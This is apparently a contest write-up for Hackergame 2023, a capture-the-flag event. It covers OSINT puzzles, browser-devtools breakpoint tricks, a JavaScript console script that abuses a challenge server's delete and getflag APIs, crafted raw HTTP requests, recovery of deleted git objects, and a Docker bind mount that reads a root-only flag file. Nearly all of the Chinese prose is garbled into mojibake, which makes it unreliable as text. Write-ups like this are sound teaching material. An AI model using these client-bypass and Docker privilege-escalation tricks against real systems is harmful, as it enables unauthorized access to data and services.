# Hackergame 2023 Writeup

markdownlint è­¦å‘Šä¸è¦ç”¨ inline HTMLï¼Œæ‰€ä»¥å°±ä¸ç”¨ `<details>` äº†ã€‚ä¸ºäº†æ›´å¥½çš„é˜…è¯»ä½“
éªŒï¼Œä¸é‡è¦æˆ–è€…å¤ªé•¿çš„æ–‡ä»¶æ”¾åˆ°äº†å­ç›®å½•ã€‚

## Hackergame å¯åŠ¨

éšä¾¿å½•ä¸€æ®µæäº¤ï¼Œå¯ä»¥çœ‹åˆ°ç›¸ä¼¼åº¦åœ¨ URL é‡Œï¼Œæ”¹æˆ `100` å†è®¿é—®å°±èƒ½é€šè¿‡ã€‚

ç½‘é¡µéœ€è¦æˆäºˆéº¦å…‹é£æƒé™æ‰èƒ½å½•åˆ¶ï¼Œç¡®å®æœ‰éšç§é¡¾è™‘ï¼Œå¦å¤–ä¸çŸ¥é“ç”µè„‘æ²¡éº¦å…‹é£çš„é€‰æ‰‹èƒ½ä¸èƒ½å½•ã€‚

## çŒ«å’ªå°æµ‹

1. æƒ³è¦å€Ÿé˜…ä¸–ç•Œå›¾ä¹¦å‡ºç‰ˆå…¬å¸å‡ºç‰ˆçš„ã€ŠA Classical Introduction To Modern Number Theory 2nd ed.ã€‹ï¼Œåº”å½“å‰å¾€ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦è¥¿åŒºå›¾ä¹¦é¦†çš„å“ªä¸€å±‚ï¼Ÿï¼ˆ30 åˆ†ï¼‰
æç¤ºï¼šæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚

    è¿›å…¥å›¾ä¹¦é¦†å®˜ç½‘ï¼ŒæŸ¥æ‰¾æ–‡çŒ®-æŸ¥æ‰¾å›¾ä¹¦ï¼Œé‡Œé¢æœ‰æŸ¥è¯¢ç³»ç»Ÿåœ°å€
    <http://opac.lib.ustc.edu.cn/>ã€‚æœç´¢æ‰“å¼€
    [å›¾ä¹¦è¯¦æƒ…](http://opac.lib.ustc.edu.cn/opac/item.php?marc_no=575078636244796b507a7652745556665243786f38637a3241695a2b3159416a54696e30697776624f496f3d)
    ï¼Œå¯ä»¥çœ‹åˆ°åœ¨è¥¿åŒºå¤–æ–‡ä¹¦åº“ã€‚å›åˆ°å›¾ä¹¦é¦†å®˜ç½‘ï¼Œæœ¬é¦†æ¦‚å†µ-é¦†è—åˆ†å¸ƒï¼Œå¯ä»¥çŸ¥é“åœ¨ `12` æ¥¼ã€‚

2. ä»Šå¹´ arXiv ç½‘ç«™çš„å¤©ä½“ç‰©ç†ç‰ˆå—ä¸Šæœ‰äººå‘è¡¨äº†ä¸€ç¯‡å…³äºã€Œå¯è§‚æµ‹å®‡å®™ä¸­çš„é¸¡çš„å¯†åº¦ä¸Šé™ã€çš„è®ºæ–‡ï¼Œè¯·é—®è®ºæ–‡ä¸­ä½œè€…è®¡ç®—å‡ºçš„é¸¡å¯†åº¦å‡½æ•°çš„ä¸Šé™ä¸º 10 çš„å¤šå°‘æ¬¡æ–¹æ¯ç«‹æ–¹ç§’å·®è·ï¼Ÿï¼ˆ30 åˆ†ï¼‰
æç¤ºï¼šæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚

    æœç´¢ `observable universe density upper limit`ï¼Œå¯ä»¥æ‰¾åˆ°
    [è®ºæ–‡](https://arxiv.org/abs/2303.17626)ï¼Œabstract é‡Œé¢å°±å†™äº†æ˜¯ `23`ã€‚

3. ä¸ºäº†æ”¯æŒ TCP BBR æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼Œåœ¨ç¼–è¯‘ Linux å†…æ ¸æ—¶åº”è¯¥é…ç½®å¥½å“ªä¸€æ¡å†…æ ¸é€‰é¡¹ï¼Ÿï¼ˆ20 åˆ†ï¼‰
æç¤ºï¼šè¾“å…¥æ ¼å¼ä¸º CONFIG_XXXXXï¼Œå¦‚ CONFIG_SCHED_SMTã€‚

    æœç´¢æ‰¾åˆ° <https://cateee.net/lkddb/web-lkddb/TCP_CONG_BBR.html>ï¼Œç­”æ¡ˆæ˜¯
    `CONFIG_TCP_CONG_BBR`ã€‚

4. ğŸ¥’ğŸ¥’ğŸ¥’ï¼šã€Œæˆ‘â€¦â€¦ä»æ²¡è§‰å¾—å†™ç±»å‹æ ‡æ³¨æœ‰æ„æ€è¿‡ã€ã€‚åœ¨ä¸€ç¯‡è®ºæ–‡ä¸­ï¼Œä½œè€…ç»™å‡ºäº†èƒ½å¤Ÿè®© Python çš„ç±»å‹æ£€æŸ¥å™¨ ~~MyPY~~ mypy é™·å…¥æ­»å¾ªç¯çš„ä»£ç ï¼Œå¹¶è¯æ˜ Python çš„ç±»å‹æ£€æŸ¥å’Œåœæœºé—®é¢˜ä¸€æ ·å›°éš¾ã€‚è¯·é—®è¿™ç¯‡è®ºæ–‡å‘è¡¨åœ¨ä»Šå¹´çš„å“ªä¸ªå­¦æœ¯ä¼šè®®ä¸Šï¼Ÿï¼ˆ20 åˆ†ï¼‰
æç¤ºï¼šä¼šè®®çš„å¤§å†™è‹±æ–‡ç®€ç§°ï¼Œæ¯”å¦‚ ISCAã€CCSã€ICMLã€‚

    æœç´¢ `python type checker mypy halting problem`ï¼Œå¯ä»¥æ‰¾åˆ° Hacker News
    [å¸–å­](https://news.ycombinator.com/item?id=32779296)ï¼Œè¿›è€Œæ‰¾åˆ°
    [è®ºæ–‡](https://arxiv.org/abs/2208.14755)ã€‚å†æœç´¢è®ºæ–‡æ ‡é¢˜ `Python Type Hints
    Are Turing Complete`ï¼Œå¯ä»¥æ‰¾åˆ°
    <https://drops.dagstuhl.de/opus/volltexte/2023/18241/>ï¼Œé‡Œé¢å†™äº†æ˜¯ `ECOOP`ã€‚

è¿™æ¬¡çš„é—®ç­”æ¯”è¾ƒå®¹æ˜“ï¼Œè€—æ—¶çŸ­è€Œä¸”ä¸€å‘é€šè¿‡ã€‚æŠ±æ­‰åšé¢˜æ—¶å¤ªæ€¥æ²¡è®°å…³é”®å­—åªä¿ç•™äº† URLï¼Œ
é¢˜è§£é‡Œçš„éƒ½æ˜¯åæ¥è¡¥çš„æˆ–è€…å¹²è„†æœä¸åˆ°äº†ã€‚

## æ›´æ·±æ›´æš—

æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œè¿› Sources ç¿»ä¸€ç¿»ã€‚flag æ˜¯åœ¨ `main.js` é‡Œç”Ÿæˆçš„ã€‚åœ¨ `main.js:91`
ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œåˆ·æ–°ç½‘é¡µå°±èƒ½åœ¨ Scope - Closure é‡Œé¢çœ‹åˆ°äº†ã€‚

## æ—…è¡Œç…§ç‰‡ 3.0

è¢«æ—…è¡Œç…§ç‰‡æå‡º PTSD äº†ã€‚

å…ˆçœ‹ EXIFï¼Œå…¨éƒ½æ²¡æœ‰ã€‚æ‰«å›¾ 2 çš„äºŒç»´ç æ˜¯ HTTP 404ã€‚

æœç´¢é‡‘ç‰Œä¸Šçš„æ–‡å­—ï¼Œæ‰¾åˆ°
[è¯ºè´å°”å¥–å®˜ç½‘](https://www.nobelprize.org/prizes/facts/the-nobel-medal-for-physics-and-chemistry/)
ï¼Œå¯ä»¥çŸ¥é“è¿™æ˜¯ç‰©ç†å¥–å’ŒåŒ–å­¦å¥–çš„å¥–ç‰Œã€‚æœç´¢äººåå¯ä»¥çŸ¥é“æ˜¯ Masatoshi Koshibaï¼Œåœ¨ä¸œäº¬å¤§å­¦ã€‚

è¿™æ—¶é‡åˆ°ä¸€å¤„æ­§ä¹‰ï¼Œâ€œåŒç§é‡‘è‰²å¥–ç‰Œâ€æ˜¯æŒ‡è¯ºè´å°”å¥–ã€ç‰©ç†å¥–æˆ–åŒ–å­¦å¥–è¿˜æ˜¯ç‰©ç†å¥–ï¼Ÿ
å½“ç„¶è¿™ä¸ªé—®é¢˜ä¸å¤§ï¼Œå¯ä»¥æšä¸¾ã€‚

æœç´¢ `University of Tokyo nobel prize`ï¼Œæ‰¾åˆ°
[å¤§å­¦å®£ä¼ é¡µ](https://www.u-tokyo.ac.jp/en/whyutokyo/indpt_utokyo_nobel_017.html)
ï¼Œé‡Œé¢å‡ºç”Ÿæœ€æ™šçš„æ˜¯ Ei-ichi Negishiï¼Œæ‹¿çš„æ˜¯åŒ–å­¦å¥–ã€‚ä»ç»´åŸºçœ‹ 2010
å¹´å¾—å¥–æ—¶åº”è¯¥åœ¨æ™®æ¸¡å¤§å­¦ã€‚

è¿™ä½å¾—å¥–è€…çš„ç ”ç©¶æ‰€ä¸å¥½æ‰¾ï¼Œç°åœ¨æ‰€åœ¨çš„æ˜¯
[å¾—å¥–åæ–°å¼€çš„](https://www.chem.purdue.edu/media/news/2011/020411.html)
ã€‚çŒœäº†å‡ ä¸ªåŸç ”ç©¶æ‰€çš„ç¡®åˆ‡ç¼©å†™ï¼Œå†™äº†ä¸ª [è„šæœ¬](./04-æ—…è¡Œç…§ç‰‡%203.0/1.js) è·Ÿæ—¥æœŸä¸€èµ·æšä¸¾ã€‚
ç­”æ¡ˆé”™è¯¯ã€‚æ³¨æ„è„šæœ¬æ²¡æœ‰é™åˆ¶å¹¶å‘æ•°ï¼Œç»„åˆå¤šæ—¶è°¨æ…ä½¿ç”¨ã€‚

å¦‚æœé™åˆ¶åˆ°ç‰©ç†å¥–ï¼Œé‚£å°±æ˜¯å›¾ç‰‡é‡Œçš„ Masatoshi Koshibaï¼Œ2002 å¾—å¥–æ—¶åº”è¯¥åœ¨
`International Center for Elementary particle Physics`ï¼Œè¿˜æ˜¯ä¸å¯¹ã€‚

å°±ç®—æ”¾å®½åˆ°è¯ºè´å°”å¥–ï¼Œå®£ä¼ é¡µä¸Šæœ€å¹´è½»çš„è¿˜æ˜¯åŒ–å­¦å¥–çš„ Ei-ichi Negishiã€‚çœ‹äº†
<https://en.wikipedia.org/wiki/List_of_Nobel_laureates_by_university_affiliation>
ï¼Œå‘ç°åŸæ¥æœ‰æ²¡åˆ—åœ¨å®£ä¼ é¡µé‡Œçš„ Takaaki Kajitaï¼Œ2015 å¹´æ‹¿çš„ç‰©ç†å¥–ï¼Œç ”ç©¶æ‰€æ˜¯
`ICRR`ã€‚æšä¸¾åå¯ä»¥çŸ¥é“ç¬¬ä¸€é¢˜çš„æ—¥æœŸæ˜¯ `2023-08-10`ã€‚

å›¾ 2 `ã‚‰ãƒ¼ã‚ã‚“ ä¸€ä¿¡` æœ‰å‡ å®¶åº—ï¼Œçœ‹å†…é¥°å’Œå‰æ–‡ä¸œå¤§å¯ä»¥çŸ¥é“æ˜¯ä¸œäº¬çš„
[è¿™å®¶](https://tabelog.com/tokyo/A1310/A131004/13246383/dtlphotolst/3/smp2/)ã€‚

å›¾ç‰‡è¯†åˆ«å¯ä»¥çŸ¥é“å›¾ 3 æ˜¯ `ä¸Šé‡æ©è³œå…¬åœ’` çš„å–·æ°´å¹¿åœºï¼Œæ´»åŠ¨åˆ—è¡¨åœ¨
<https://www.kensetsu.metro.tokyo.lg.jp/jimusho/toubuk/ueno/event.html>
ï¼Œä½†æ˜¯åªæœ‰æ­£åœ¨è¿›è¡Œä¸­çš„ã€‚Wayback Machine ä¸Šåªæœ‰ 5 æœˆå’Œ 6
æœˆçš„å­˜æ¡£ã€‚ä»è¿™å¼ è¿œæ™¯ç…§ç‰‡å®åœ¨çœ‹ä¸å‡ºæ¥æ˜¯ä»€ä¹ˆæ´»åŠ¨ã€‚

çŸ¥é“æ—¥æœŸå°±å¥½å¤šäº†ï¼Œå¯ä»¥æ‰¾åˆ°æ˜¯ 2023-08-10 - 2023-08-13 çš„
[ã€Œå…¨å›½æ¢…é…’ã¾ã¤ã‚Šinæ±äº¬2023ã€](https://umeshu-matsuri.jp/tokyo_ueno/)
ï¼Œå¾€ä¸‹ç¿»å°±æœ‰é—®å·é“¾æ¥ï¼Œç¼–å·æ˜¯ `S495584522`ã€‚

ä»åœ°å›¾çœ‹ï¼Œæ—è¾¹çš„åšç‰©é¦†æ˜¯å›½ç«‹ç§‘å­¦åšç‰©é¤¨ã€‚
[å®˜ç½‘](https://www.kahaku.go.jp/userguide/access/) æœ‰å†™ä»·æ ¼ï¼Œè¯•äº† `630`
ä¸å¯¹ï¼Œå®é™…ä»·æ ¼æ˜¯ `0`ï¼Œåº”è¯¥æ˜¯å±äºä¸‹é¢å‡ ç§å…è´¹çš„æƒ…å†µä¹‹ä¸€ã€‚

ç¬¬ 5 é¢˜é—®å­¦é•¿æ™šä¸Šè¦åœ¨å“ªé‡Œé›†åˆï¼Œä»å‰æ–‡çœ‹æ˜¯åèˆ¹çš„åœ°æ–¹ï¼Œæœç´¢å¯çŸ¥æ˜¯
[ãŠå°å ´æµ·æµœå…¬åœ’æ°´ä¸Šãƒã‚¹ã®ã‚Šã°](https://www.suijobus.co.jp/cruise/odaiba/)
ã€‚çœ‹åœ°å›¾æœ‰è‡ªç”±å¥³ç¥åƒï¼Œå°±å®ƒäº†ã€‚

å›¾ 4 è¿˜æ˜¯ç”¨å›¾ç‰‡è¯†åˆ«ï¼Œæ‰¾åˆ°
<https://gonintendo.com/archives/331919-nintendo-tokyo-will-be-closed-this-weekend>
ï¼Œå¯ä»¥çŸ¥é“æ˜¯åœ¨æ¶©è°·çš„ Nintendo TOKYOã€‚

ç¬¬ 6 é¢˜ç¬¬ä¸€é—®ä¸å¤ªå¥½æ‰¾ï¼Œä¸€é¡¿å°è¯•åç”¨ `ãƒœã‚¿ãƒ³ ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ ä¸Šé‡` å¯ä»¥æœç´¢åˆ°
<https://plaza.rakuten.co.jp/ayumilife/diary/202308040000/>ï¼Œæµ·æŠ¥é‡Œçš„æ˜¯ `ç†ŠçŒ«`ã€‚

ç¬¬ 6 é¢˜ç¬¬äºŒé—®ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä¸Šé‡ç«™å‡ºç«™å£ï¼Œæœç´¢åˆ°ä¸€äº› 6 æœˆçš„
[æŠ¥é“](https://www.watch.impress.co.jp/docs/news/1506558.html)
è¯´è¦åœ¨ åºƒå°è·¯å£é§…å‰åºƒå ´ å»º 3D å¹¿å‘Šç‰Œã€‚è™½ç„¶å†™çš„æ˜¯å†¬å¤©ï¼Œä½†è¯´ä¸å®šæå‰å®Œå·¥äº†ã€‚
åˆæ˜¯æœç´¢åˆæ˜¯è¡—æ™¯åŠå¤©æ²¡æ‰¾åˆ°ã€‚åæ¥æ‰æƒ³åˆ°æ˜¯æ¶©è°·ï¼Œ
å› ä¸º 3D å¹¿å‘Šç‰Œä¸å¤šï¼Œæœç´¢ `Japan 3D billboard` ä¸ç®¡åœ°ç‚¹å…¨å†™è¿›è„šæœ¬é‡Œäº†ã€‚

å¯åŠ¨è„šæœ¬ï¼Œç­”æ¡ˆé”™è¯¯ã€‚åªæœ‰ç†ŠçŒ«æ˜¯ç¡®å®šçš„ï¼Œå…¶ä»–ä¸¤é—®ä¸ç¡®å®šã€‚æœç´¢æ·»åŠ å»ºç­‘åå’ŒåŠ¨ç‰©åï¼Œè¿˜æ˜¯ä¸å¯¹ã€‚
æŠ˜è…¾äº†å¥½ä¹…ï¼Œç”šè‡³æŠŠ LLM åˆ—çš„ä¸‰å­—åŠ¨ç‰©åéƒ½è¯•äº†ä¸€ä¸‹ï¼ˆåªè·Ÿæœ€å¯èƒ½çš„å‡ ä¸ªå»ºç­‘åç»„åˆï¼‰ã€‚
æœ€ååªå¥½æ¥å—ç°å®ï¼Œè™½ç„¶å¿« 300 ä¸ªäººé€šè¿‡ï¼Œä½†æˆ‘åšä¸å‡ºæ¥ã€‚è¿˜å¥½å‰æ’æœ‰ä¸€äº›äººä¹Ÿæ²¡åšå‡ºæ¥ï¼ˆã€‚

èµ›åçœ‹é¢˜è§£ï¼ŒåŸæ¥æ˜¯æ¼äº†å­¦é•¿æˆ´çš„å¸¦å­ä¸Šçš„ä¼šè®®åï¼Œæ—¥æœŸæ˜¯æ ¹æ®ä¼šè®®å’Œå…¬å›­æ´»åŠ¨ç¡®å®šçš„ã€‚
è¿™ä¸ªå…¶å®æŒºæ˜¾çœ¼çš„ï¼Œä¸è¿‡æ²¡æƒ³åˆ°â€œå­¦æœ¯ä¹‹æ—…â€æ˜¯å­—é¢æ„ä¹‰ä¸Šçš„å­¦æœ¯æ´»åŠ¨ï¼Œä»¥ä¸ºè¯´çš„æ˜¯æ—…æ¸¸ã€‚

## èµ›åšäº•å­—æ£‹

å…ˆä¸‹ä¸€å±€è§‚å¯Ÿï¼Œå¯ä»¥çœ‹åˆ°å‘é€çš„æ˜¯è½å­çš„åæ ‡ã€‚`script.js` è´´å¿ƒåœ°åŠ äº†æ³¨é‡Šï¼Œæ•…æŠ€é‡æ–½åœ¨
`script.js:166` è®¾ç½®æ–­ç‚¹ï¼Œéšä¾¿ä¸‹ä¸€ä¸ªä½ç½®ï¼ŒæŒ‰ ESC è°ƒå‡º
Consoleï¼Œä¿®æ”¹ä¸ºæƒ³è¦çš„å€¼ç‚¹ç»§ç»­å³å¯ã€‚åç«¯æ²¡æœ‰åˆ¤æ–­ç›®æ ‡åæ ‡æ˜¯å¦å·²ç»æœ‰æ£‹å­ã€‚

## å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹

æ­£å¥½å‰å‡ å¤©åœ¨ GeekGame-3rd ç¾¤çœ‹åˆ° CVE-2023-28303 Windows Snipping Tool
Information Disclosureï¼Œä¸€çœ‹é¢˜ç›®å°±çŒœåˆ°äº†ã€‚

æœç´¢ `pixel screenshot crop` å¯ä»¥æ‰¾åˆ°
[æŠ¥é“](https://arstechnica.com/gadgets/2023/03/google-pixel-bug-lets-you-uncrop-the-last-four-years-of-screenshots/)
ï¼Œæ˜¯ CVE-2023-21036ã€‚é‡Œé¢æœ‰æåˆ°ç½‘ç«™ <https://acropalypse.app/>ï¼Œè¯•äº†ä¸‹ï¼Œé€‰ Pixel
4 å¯ä»¥è¿˜åŸå‡ºæ¥ã€‚

## ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨

å¼€ç€å¼€å‘è€…å·¥å…·è®¿é—®ï¼Œå¯ä»¥çœ‹åˆ°ç½‘é¡µè¯·æ±‚äº† `/api/getMessages`
è·å–æ¶ˆæ¯åˆ—è¡¨ï¼Œæ’¤å›æ—¶è¯·æ±‚ `/api/deleteMessage`ï¼Œæœ€åä¼šè¯·æ±‚ `/api/getflag`ã€‚
ä»¿ç…§èµ›åšäº•å­—æ£‹ï¼ŒæŸ¥æ–‡æ¡£å†™ç‚¹ä»£ç ï¼Œåœ¨æ§åˆ¶å°æ‰§è¡Œå°±è¡Œã€‚

```javascript
// https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch

async function block() {
    const response = await fetch(
        "http://202.38.93.111:10021/api/getMessages",
        {
            "method": "POST",
            "headers": {
                "Accept": "application/json, text/plain, */*",
            },
        }
    );
    const data = await response.json();
    data['messages'].forEach((element, index) => {
        if (!(/hack\[[a-z]*\]/.test(element['text']))) {
            return;
        }
        setTimeout(() => {
            fetch(
                'http://202.38.93.111:10021/api/deleteMessage',
                {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json, text/plain, */*",
                    },
                    "body": JSON.stringify({"id": index}),
                }
            )
        }, element['delay'] * 1000)
    });
    console.log(data);
}
block();

async function get() {
    const response = await fetch(
        "http://202.38.93.111:10021/api/getflag",
        {
            "method": "POST",
            "headers": {
                "Accept": "application/json, text/plain, */*",
            },
        }
    );
    console.log(await response.json());
}
get();
```

## è™«

é—®äº† LLMï¼Œåªç»™äº†ä¸€äº›å®½æ³›çš„æ„è§ã€‚ä»é€šè¿‡äººæ•°å’Œæè¿°æ¥çœ‹ä¸åƒæ˜¯éšå†™ï¼Œåº”è¯¥æ˜¯æœ‰åçš„ç¼–ç æ–¹å¼ã€‚
ä¸‹è½½ Audacity æ‰“å¼€ï¼Œå‘ç°å¤§å¤šé›†ä¸­åœ¨å‡ ä¸ªé¢‘ç‡ã€‚æœç´¢ `1500Hz 1900Hz 2300Hz`ï¼Œå¯ä»¥çŸ¥é“æ˜¯
SSTVã€‚

ä¸‹è½½ [MMSSTV](https://hamsoft.ca/pages/mmsstv.php)ï¼Œçœ‹äº†ä¸€ä¼šæ²¡ææ‡‚è¦æ€ä¹ˆå¯¼å…¥æ–‡ä»¶ã€‚
æœç´¢åˆ°ä¸€ä¸ª
[é—®é¢˜](https://ham.stackexchange.com/questions/17399/sstv-decoder-for-already-recorded-files)
ï¼Œå¥½åƒåªèƒ½ç”¨éº¦å…‹é£ã€‚æ‡’å¾—æŠ˜è…¾è™šæ‹Ÿéº¦å…‹é£äº†ï¼Œè¶ç€è¿˜ä¸æ˜¯å¾ˆæ™šï¼Œç›´æ¥å¤–æ”¾éŸ³é¢‘ã€‚
è½¯ä»¶ä¼šè‡ªåŠ¨æ¥æ”¶å¹¶æ˜¾ç¤ºï¼Œå¾ˆé…·ã€‚å›¾ç‰‡å¾ˆç³Šï¼Œå‹‰å¼ºèƒ½è¯»å‡ºå†…å®¹ã€‚

![recovered flag](./08-è™«/flag.png)

## JSON âŠ‚ YAML?

ä¸€é¡¿æœç´¢ï¼Œå¯ä»¥æ‰¾åˆ°è¿™ä¸ª
[é—®é¢˜](https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files)
ã€‚å›ç­”å†…å®¹ç›´æ¥å°±æ˜¯ YAML 1.2 ä¸å…¼å®¹ JSON çš„åœ°æ–¹ï¼Œæ˜ å°„çš„é”®å€¼ä¸å…è®¸é‡å¤ã€‚

```json
{"a":1,"a":2}
```

å†ç‚¹å¼€å¼•ç”¨çš„ Wikipedia é“¾æ¥ï¼Œé‡Œé¢çš„è„šæ³¨å°±æ˜¯ YAML 1.1 ä¸å…¼å®¹çš„åœ°æ–¹ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯ UTF-32
å­—ç¬¦çš„è½¬ä¹‰ä¸å…¼å®¹ã€‚

```plaintext
Input your JSON: "\ud83f\udfff"
As JSON: '\U0001ffff'
As YAML 1.1: '\ud83f\udfff'
```

## Git? Git!

çœ‹å®Œé¢˜ç›®ï¼Œç¿»å‡ºéå†æ‰€æœ‰æœ¬åœ°å¯¹è±¡çš„å‘½ä»¤ï¼Œä¸ç®¡æ˜¯ blobã€tree è¿˜æ˜¯ commitï¼Œå…¨ cat å‡ºæ¥
grep äº†ã€‚

```shell
git cat-file --batch-check --batch-all-objects --unordered \
| cut -d ' ' -f 1 | xargs -n 1 git cat-file -p | grep flag
```

èµ›åçœ‹äº†ä¸‹ï¼Œè¿˜åœ¨ reflog é‡Œã€‚

```shell
git reflog
# (HEAD -> main) HEAD@{0}: commit: Trim trailing spaces
# (origin/main, origin/HEAD) HEAD@{1}: reset: moving to HEAD~
# HEAD@{2}: commit: Trim trailing spaces
git show HEAD@{2} | grep flag
```

å®é™…ä¸Š reflog ä¹Ÿæ˜¯å¯ä»¥æ•…æ„ [æ‰‹åŠ¨åˆ é™¤](https://git-scm.com/docs/git-reflog)
çš„ï¼Œä½†å³ä½¿å¼•ç”¨è®¡æ•°é™åˆ°äº† 0ï¼Œgc æ—¶åªè¦è¿˜æ²¡è¿‡æœŸå°±ä¸ä¼šåˆ æ‰ã€‚æœ‰å…´è¶£çš„è¯»è€…å¯ä»¥è·Ÿç€
<https://git-scm.com/book/en/v2/Git-Internals-Maintenance-and-Data-Recovery>
åšä¸€éå®éªŒï¼Œçœ‹çœ‹è¦æ•…æ„åˆ æ‰ä¸€ä¸ª object æœ‰å¤šéš¾ã€‚

## HTTP é›†é‚®å†Œ

æŒºæœ‰æ•™è‚²æ„ä¹‰çš„é¢˜ç›®ã€‚ä¸€å¼€å§‹çœ‹åˆ°è§£ç æ–¹å¼ä»¥ä¸ºè¦ç”¨ç‰¹æ®Šå­—ç¬¦ï¼Œå®é™…æ˜¯å¯¹ç€æ–‡æ¡£ä¸€ä¸ªä¸ªè¯•å‡ºæ¥çš„ã€‚

<https://www.nginx.com/resources/wiki/extending/api/http/>

<https://developer.mozilla.org/en-US/docs/Web/HTTP/Status>

>ä½ ç›®å‰æ”¶é›†åˆ°äº† 12 ä¸ªçŠ¶æ€ç ï¼š[100, 200, 206, 304, 400, 404, 405, 412, 413, 416, 501, 505]

ç›´æ¥æ”¾è¯·æ±‚å†…å®¹å’Œè¿”å›ï¼Œæœ‰ç‰¹åˆ«çš„åœ°æ–¹ä¼šè¯´æ˜ã€‚

```plaintext
GET ../ HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

400 Bad Request

```plaintext
GET /asddf HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

404 Not Found

```plaintext
POST / HTTP/1.1\r\n
Host: example.com\r\n\r\n\r\n
```

405 Not Allowed

```plaintext
GET / HTTP/4\r\n
Host: example.com\r\n\r\n
```

505 HTTP Version Not Supported

```plaintext
GET / HTTP/1.1\r\n
Host: example.com\r\n
Expect: 100-continue\r\n\r\n
```

100 Continue

```plaintext
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 1234567890987\r\n
Expect: 100-continue\r\n\r\n
```

413 Request Entity Too Large

è¿™é‡Œæœ¬æ¥æƒ³è¦ 417 Expectation Failedï¼Œç»“æœæ²¡å‡ºæ¥ã€‚

```plaintext
GET / HTTP/1.1\r\n
Host: example.com\r\n
Upgrade: websocket\r\n
Connection: Upgrade\r\n
Sec-WebSocket-Key:pAloKxsGSHtpIHrJdWLvzQ==\r\n
Sec-WebSocket-Version:13\r\n
\r\n\r\n
```

101 Switching Protocols ä¹Ÿæ˜¯ä¸è¡Œã€‚

```plaintext
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=1-2\r\n\r\n
```

206 Partial Content

```plaintext
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=1\r\n\r\n
```

416 Requested Range Not Satisfiable

```plaintext
HEAD /index.html HTTP/1.1\r\n
Host: example.com\r\n
If-Unmodified-Since: Wed, 21 Oct 2015 07:28:00 GMT\r\n\r\n
```

412 Precondition Failed

æœ¬æ¥æƒ³è¦ 304ï¼Œç»“æœå‡ºäº†è¿™ä¸ªã€‚

```plaintext
GET /50x.html HTTP/1.1\r\n
Host: example.com\r\n
If-None-Match: "64dbafc8-1f1"\r\n\r\n
```

304 Not Modified

```plaintext
GET / HTTP/1.1\r\n
Host: example.com\r\n
Transfer-Encoding: gzip\r\n\r\n
```

501 Not Implemented

åŸæ¥å¥½åƒä¸æ˜¯æƒ³è¦è¿™ä¸ªçš„ï¼Œä½†æ˜¯å¿˜äº†ã€‚

flag2 å¡äº†æ¯”è¾ƒä¹…ï¼Œæœç´¢å¼•æ“å’Œ LLM éƒ½æ‰¾ä¸åˆ°ï¼Œåœ¨æœ¬åœ° fuzz
äº†ä¸€é¡¿ä¹Ÿå‡ºä¸æ¥ã€‚çœ‹é€šè¿‡äººæ•°è¿™ä¹ˆå¤šï¼Œè€Œä¸”ç¾¤é‡Œæœ‰äººè¯´ä¸å°å¿ƒè¿‡çš„ï¼Œå°±ä¹±æ”¹äº†ä¸€é¡¿ï¼Œ
åŸæ¥æ˜¯ HTTP/0.9ã€‚

```plaintext
GET   /\r\n HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

## Docker for Everyone

å…ˆçœ‹çœ‹ `/flag` çš„å®é™…ä½ç½®ï¼Œbind mount åˆ°å®¹å™¨é‡Œå°±èƒ½è¯»ã€‚

```shell
ls -l /flag
# lrwxrwxrwx    1 root     root            13 Oct  8 12:10 /flag -> /dev/shm/flag
ls -l /dev/shm/flag
# -r--------    1 root     root           512 Nov  4 19:51 /dev/shm/flag
docker images
# REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
# alpine       latest    187eae39ad94   2 months ago   5.54MB
docker run -it --rm -v /dev/shm/flag:/flag alpine
cat /flag
```

çœ‹äº†å®˜æ–¹é¢˜è§£ï¼Œæˆ‘çš„æµè§ˆå™¨å¼€å§‹å†’æ ‡ç­¾é¡µäº†ã€‚

## æƒœå­—å¦‚é‡‘ 2.0

å…ˆæ‰‹åŠ¨è¿˜åŸä¸€éƒ¨åˆ†ä»£ç ï¼Œå¯ä»¥çœ‹å‡º `code_dict` æ¯ä¸ªå­—ç¬¦ä¸²éƒ½è¢«åˆ æ‰äº†ä¸€ä¸ªå­—ç¬¦ï¼Œæœ€åæ˜¯ä»
`code_dict` çš„æŒ‡å®šä¸‹æ ‡å–å­—ç¬¦æ‹¼èµ·æ¥ã€‚é¦–å°¾çš„ `flag{` å’Œ `}`
æ˜¯ç¡®å®šçš„ï¼Œå…ˆæŠŠæ£€æŸ¥æ³¨é‡Šæ‰ï¼Œçœ‹çœ‹è¿™å‡ ä¸ªå­—ç¬¦ç›®å‰çš„ä¸‹æ ‡ã€‚

```python
def find_all(c: str, s: str):
    l = []
    start = 0
    while True:
        pos = s.find(c, start)
        if pos == -1:
            break
        l.append(pos)
        start = pos + 1
    return l

code_dict = get_code_dict()
for c in 'flag{}':
    print(find_all(c, code_dict))
# [11, 50, 74]
# [12, 40, 47, 72, 111]
# [20, 23, 54, 81, 82, 88, 90]
# [25, 31, 104]
# [71, 84]
# [16, 27]
```

è·Ÿâ€œå¯†æ–‡â€å¯¹ç…§åå¯ä»¥çŸ¥é“å¯¹åº”å…³ç³»æ˜¯ 50 - 53ã€40 - 41ã€81 - 85ã€104 - 109ã€71 -
75ã€27 - 28ã€‚

å› ä¸º 40 - 41 åç§»æ˜¯ 1ï¼Œè¯´æ˜ç¬¬äºŒä¸ªå­—ç¬¦ä¸²åˆ æ‰çš„å­—ç¬¦åœ¨ 40 çš„ `l` çš„åé¢ï¼ˆå¦åˆ™åç§»åº”è¯¥æ˜¯
